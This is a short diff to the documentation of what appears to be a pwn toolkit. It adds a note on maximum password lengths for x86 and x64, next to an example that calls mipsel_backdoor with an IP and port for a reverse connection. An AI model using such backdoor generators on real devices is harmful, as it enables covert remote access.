@@ -45,7 +45,7 @@ When importing this module will import the pwn module
 ```
 
 expample:
-
+（Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
 ```
 >>> mipsel_backdoor("127.0.0.1",5566)
 [+] reverse_ip is: 127.0.0.1
